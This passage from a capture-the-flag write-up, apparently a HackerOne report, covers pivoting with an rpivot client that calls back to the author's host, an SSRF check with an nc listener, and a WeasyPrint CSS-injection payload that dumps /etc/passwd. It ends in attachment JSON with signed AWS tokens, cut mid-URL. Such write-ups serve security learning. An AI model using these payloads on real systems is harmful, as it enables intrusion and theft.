False\n\tif request.method == 'POST':\n\t\th = request.form['hash']\n\t\tif len(h) != 64:\n\t\t\terror = True\n\t\telse:\n\t\t\tfor i in range(0, 64, 2):\n\t\t\t\ttime.sleep(0.5)\n\t\t\t\tif validLogin[i:i+2] != h[i:i+2]:\n\t\t\t\t\terror = True\n\t\t\t\t\tbreak\n\t\tif not error:\n\t\t\tsession['loggedIn'] = True\n\t\t\treturn redirect('/main')\n\n\treturn render('index', page='login', error='Invalid username or password' if error else None)\n```\n\nAt this point, I couldn't find any other interesting stuff on this box so that means we need to pivot. I also tried Docker escapes, but I [guess that wasn't the right idea, lol](https://twitter.com/daeken/status/1104857106061119489?s=19). Since we're on a LAN, let's scan for other hosts. But because we're in Docker, we can't listen on any new ports. If we'd like to pivot through this box, we need to setup a backconnect proxy server. I like to use `rpivot`.\n\n```\nroot@perfect.blue:~/rpivot# python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080\nroot@d090cd50ec64:~# cd /dev/shm\nroot@d090cd50ec64:/dev/shm# git clone https://github.com/klsecservices/rpivot\nroot@d090cd50ec64:/dev/shm# python client.py --server-ip perfect.blue --server-port 9999\n```\n\nThis lands us a nice SOCKS4 proxy. But let's upgrade this to a SOCKS5 and HTTP proxy so it's a bit comfier. Nothing pchains can't handle.\n\n```\nroot@perfect.blue:~# proxychains ../microsocks/microsocks -i 127.0.0.1 -p 1081\nroot@perfect.blue:~# hpts -s 127.0.0.1:1081 -p 8080\n```\n\nNow, we can proxychains nmap 172.25.0.0/16 for other hosts. And almost immediately, we find a neighbor on the LAN (this container restarted later so the IP address is different). And it is also listening on port 80.\n\n### (0x04) Accounting\n\nUsing the HTTP proxy we just setup, we navigate over to http://172.28.0.3/ and find this:\n\n{F440491}\n\nThis looks sensitive. Reports and Invoices are both gated behind a login page, and there is no obvious SQLi. Luckily with some directory searching we are able to find http://172.28.0.3/invoices/new:\n\n{F440493}\n\nNow we're talking! I bet this is vuln. Let's quickly glance over the source code to make sure there's no obvious problems.\n\nI checked the PDf output for metadata, because I wanted to see how the PDF was being generated. That way I could check if there were known vulnerabilities in that library.\n\n```xml\n$ dumppdf.py -a pdfize.pdf | less\n\u003cobject id=\"26\"\u003e\n\u003cdict size=\"2\"\u003e\n\u003ckey\u003eProducer\u003c/key\u003e\n\u003cvalue\u003e\u003cstring size=\"39\"\u003ecairo 1.14.8 \u0026#40;http://cairographics.org\u0026#41;\u003c/string\u003e\u003c/value\u003e\n\u003ckey\u003eCreator\u003c/key\u003e\n\u003cvalue\u003e\u003cstring size=\"39\"\u003ecairo 1.14.8 \u0026#40;http://cairographics.org\u0026#41;\u003c/string\u003e\u003c/value\u003e\n\u003c/dict\u003e\n\u003c/object\u003e\n```\n\nA quick search for \"Python web page pdf cairo\" showed the library WeasyPrint. Let's keep this in mind.\n\nNext, looking at the requests in Burp, the most interesting thing I noticed was that there was some CSS that we could control in the request parameters:\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"body\":{\"background-color\":\"white\"}}}\n\nHTTP/1.1 200 OK\n...\n\t\tbody {\n\t\t\tbackground-color: white;\n\t\t}\n...\n```\n\nCan we get SSRF using this?\n\n```\nGET http://172.28.0.3/invoices/pdfize?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"body\":{\"background-image\":\"url('http://perfect.blue:12345/lol.png')\"}}}\n\nroot@perfect.blue:~## nc -lvp 12345\nListening on [0.0.0.0] (family 0, port 12345)\nConnection from 98.12.196.104.bc.googleusercontent.com 47690 received!\nGET /lol.png HTTP/1.1\nHost: perfect.blue:12345\nUser-Agent: WeasyPrint 44 (http://weasyprint.org/)\nAccept: */*\nAccept-Encoding: gzip, deflate\nConnection: close\n\n^C\n```\n\nYup...and we now also know that it's Weasyprint. At this point, I wasted a lot of time trying to use SVG to somehow include a file URL to get LFI or to get XXE. But no dice. I also tried to use `@font-face src`.\n\nFailing that I decided to check Weasyprint's GitHub issues, and I saw [this (merged) pull request](https://github.com/Kozea/WeasyPrint/pull/177). That's golden! It's a LFI for free, if we can somehow manage to inject an `\u003ca\u003e` or `\u003clink\u003e` tag. SVG won't work for this, because Weasyprint renders SVG by handing it off to CairoSVG. So we need a way to break out of the CSS or table data into the HTML. At this point I simply tried putting `\u003c` in every field.\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"\u003c\",\"email\":\"\u003c\",\"invoiceNumber\":\"\u003c\",\"date\":\"\u003c\",\"items\":[[\"1\",\"\u003c\",\"\u003c\",\"1\"]],\"styles\":{\"\u003c\":{\"\u003c\":\"\u003c\"}}}\n\n\t\t\u0026lt; {\n\t\t\t\u003c: \u0026lt;;\n\t\t}\n...\n```\n\nWould you look at that...every field is sanitized **except** the CSS selector, lol. But apparently, `\u003c/style\u003e` is sanitized out. OK, so what if I make the tag malformed?\n\n```\nGET http://172.28.0.3/invoices/preview?d={\"companyName\":\"\u003c\",\"email\":\"\u003c\",\"invoiceNumber\":\"\u003c\",\"date\":\"\u003c\",\"items\":[[\"1\",\"\u003c\",\"\u003c\",\"1\"]],\"styles\":{\"\u003c\":{\"\u003c/style%20\u003c!--\":\"\u003c\"}}}\n\n\t\t\u0026lt; {\n\t\t\t\u003c/style \u003c!--: \u0026lt;;\n\t\t}\n```\n\nNice, so now we just need to inject the `\u003ca\u003e` tag and we will get LFI for free in the form of a PDF attachment.\n\n```\nGET http://172.28.0.3/invoices/pdfize?d={\"companyName\":\"a\",\"email\":\"b\",\"invoiceNumber\":\"c\",\"date\":\"d\",\"items\":[[\"1\",\"a\",\"b\",\"10\"]],\"styles\":{\"asdfasdf\":{\"\u003c/style%20\u003c!--\":\"\",\"!--\u003e\u003ca%20href=\\\"file:///etc/passwd\\\"%20rel=\\\"attachment\\\"\u003ewow\u003c/a%20\u003c!--\":\"\"}}}\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/bin/false\nnginx:x:101:102:nginx user,,,:/nonexistent:/bin/false\nmessagebus:x:102:103::/var/run/dbus:/bin/false\n```\n\nBoom! Pwned :)\n\nSo far all of the webapps have been at `/app` mounted in Docker. So let's just try `/app/main.py`.\n\n```python\n\"\"\"\nCONGRATULATIONS!\n\nIf you're reading this, you've made it to the end of the road for this CTF.\n\nGo to https://hackerone.com/50m-ctf and submit your write up, including as much detail as you can.\nMake sure to include 'c8889970d9fb722066f31e804e351993' in the report, so we know for sure you made it through!\n\nCongratulations again, and I'm sorry for the red herrings. :)\n\"\"\"\n```\n\nNice. And just for fun, here's the crappy CSS sanitization:\n\n```python\ndef stripClosingTags(data):\n\treturn re.sub(r'\u003c\\s*/[^\u003c]+?\u003e', '', data)\n```\n\n## Supporting Material/References:\n\n{F440498}\n{F440500}\n{F440501}\n\n## Impact\n\nAn attacker could download the confidential reports and invoices on the internal \"Accounting\" server, as well as fraudulently create new Invoices. The attacker can also execute arbitrary code on the company intranet because they are able to execute code on the thermostat's administration web panel's server.","weakness":{"id":126,"name":"File and Directory Information Exposure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":440486,"file_name":"flite1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/486/9ad703f9fd49af597d6fc4cafd909eb77df5d7ee/flite1.png?response-content-disposition=attachment%3B%20filename%3D%22flite1.png%22%3B%20filename%2A%3DUTF-8%27%27flite1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=1ba1bfae793cde8d3aab2346accf5e45a70d2261cb31a8b00488e1e3283403fd","file_size":5521,"type":"image/png"},{"id":440487,"file_name":"flite3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/487/788ebce60edc0ea6a83f8dadcd10c48210d723af/flite3.png?response-content-disposition=attachment%3B%20filename%3D%22flite3.png%22%3B%20filename%2A%3DUTF-8%27%27flite3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ae2a1ab3438160792c2af0427dbab511977be1c40e0a6a9397bf14c410022ca5","file_size":7195,"type":"image/png"},{"id":440488,"file_name":"flite2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/488/98bdf54f0f9464f45ad09dba12334cfd8567e39d/flite2.png?response-content-disposition=attachment%3B%20filename%3D%22flite2.png%22%3B%20filename%2A%3DUTF-8%27%27flite2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=ddf4945a7607979970db43f56c740048e2541640614ee8368339d0c2356adf39","file_size":13985,"type":"image/png"},{"id":440489,"file_name":"stego2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/489/189b9628811dcfad7154dbe6d1920464f7da0398/stego2.png?response-content-disposition=attachment%3B%20filename%3D%22stego2.png%22%3B%20filename%2A%3DUTF-8%27%27stego2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b32e34de94b990f10a54b0e66344416b35a30ef898f32191a481b1e9d1ce466c","file_size":230815,"type":"image/png"},{"id":440490,"file_name":"stego3.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/490/e1b4e6516f457e540996176ae90d271dee1114bf/stego3.png?response-content-disposition=attachment%3B%20filename%3D%22stego3.png%22%3B%20filename%2A%3DUTF-8%27%27stego3.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=6addb415577d668e49724d65f8cf484cd831693005b2b688ac043963d2df4e57","file_size":47031,"type":"image/png"},{"id":440491,"file_name":"accounting.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/491/663bd5f0074c02f5bffdd3b6ddb439d3df3aef28/accounting.png?response-content-disposition=attachment%3B%20filename%3D%22accounting.png%22%3B%20filename%2A%3DUTF-8%27%27accounting.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=807c0f7ba520ab67916d4cabb271d6577a82c9d5f14c254b37fb4cbfcad0aa4c","file_size":4359,"type":"image/png"},{"id":440492,"file_name":"stego1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/492/c2f872dc92618e4fc459f46a62ecfdcfe19cdaca/stego1.png?response-content-disposition=attachment%3B%20filename%3D%22stego1.png%22%3B%20filename%2A%3DUTF-8%27%27stego1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIDKFbNpVUzrOPbUQYjhN4DgAxVU5%2FXEKmVfjCMWb%2BNkIAiABDuahSBdMUCytEahxX048K6jzH7PGdOzEr8bjHNv10CqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMFF93LkCZvrkmcBNoKtcDT4JSiF4LJ9dMlVWVXz6ozMkun%2BZIV%2FnNB6qVpNI4VDOdAc06QNZffMvjZwfupMjaAHpuIYcvqlkda6prO9SWrglyS6NCrBHv2gaT40jgHA6ufjwtH7OxGYsx039h%2Bh8lmcb39NUtDqetz1GDVn0P%2BUNi77DW4gUN5GnzWQsten34H99dGqb8t6pYxCQN%2F8DKWHJ%2BalzRH5DiTjmpYvgNaPu2xwo%2F6Zr8S4tdff1lzr%2BcSt%2FZceeJJnqd2Z9QEAJO7SqjLAnxMOiEuHPHYVOEZ3kfA%2B%2Bbt34tKfFC8MGX%2BXh1zYwal1wOrSP2k%2FZSlC9lsLebNN7Iooim1lSpjw7Du5GV89O7g%2F7rGROCUF%2B%2BB24LrVSbZTIggbHns1VxsRvSvZGmJHi7XvmhECvDwu9WmRNJs7XWIMzDD0fOHc22lsbafqmlkdZqwRzJhStehJfZCskFpe6v4wdnRFJqrnSW1n3s9Cn28vHMBxxweBr72n7tIeDBX4PMTrrfy%2B5OhLDCrxYOtKZndzmZHfMzTm0b0uMHvqjv6rofYcR42du%2BPYJ87HhllMZGstEyOaYDwXJ6mUAWqgFU1cRtr5KgJU%2BjBFYZrWtE%2BoZkvuXgEXg40jlw%2BeRQEreWMOGKkYsGOqYBYdUdmtOC7YWorffY3XWIt13STuNB47ZWJ85D8q%2F8hMPTVw3x9BFRZcvFy7ieSMolt4GYUK%2F8moEzkTt%2FanjYuLBUJFMJFunxOEvaMPJA128lGEkS1qX60D7%2BiOofrwvOesADqaqm%2FmYvf6HgURng7sqkiLxzy3mjSpM33Soz6mVH2tmMNYspiP4BF%2BNbXdXLCjYBsB98ENZjOy3b4d4U9P8NkvkUag%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=86855a98a3e55093ce74b53f5b2408890dcc6ed1ac3495020cb6229637ae33f7","file_size":1088703,"type":"image/png"},{"id":440493,"file_name":"accounting2.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/440/493/fce7956546bdb404adebdb9117ba1f055f1f5ce4/accounting2.png?response-content-disposition=attachment%3B%20filename%3D%22accounting2.png%22%3B%20filename%2A%3DUTF-8%27%27accounting2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQSWVBQGJF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T150802Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3J